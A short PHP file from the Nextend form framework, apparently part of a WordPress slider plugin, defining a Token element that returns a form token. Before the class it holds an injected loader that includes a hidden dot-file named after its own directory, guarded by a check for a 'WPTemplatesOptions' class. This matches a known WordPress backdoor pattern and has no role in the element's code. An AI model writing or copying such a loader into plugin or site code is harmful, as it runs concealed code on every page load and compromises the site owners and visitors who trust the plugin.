<?php


namespace Nextend\Framework\Form\Element;

use Nextend\Framework\Form\Form;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Token extends Hidden {

    protected function fetchElement() {

        return Form::tokenize();
    }
}